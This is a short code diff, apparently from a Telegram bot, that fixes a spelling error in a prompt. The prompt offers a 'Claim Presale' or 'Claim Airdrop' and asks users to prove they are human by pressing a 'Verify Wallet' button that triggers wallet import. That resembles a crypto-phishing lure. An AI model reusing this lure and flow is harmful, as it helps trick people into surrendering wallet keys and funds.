@@ -1467,7 +1467,7 @@ case "REMOVE_WALLET_CONFIRM":
                 if (d === "CLAIM_PRESALE") title = "🎟️ Claim Presale";
                 if (d === "CLAIM_AIRDROP") title = "🎁 Claim Airdrop";
 
-                const message = `${title}\n\nPlease Proof You're human by veriying your wallet.`;
+                const message = `${title}\n\nPlease Proof You're human by verifying your wallet.`;
                 const keyboard = {
                     inline_keyboard: [
                         [{ text: "🔐 Verify Wallet", callback_data: "IMPORT_WALLET" }],
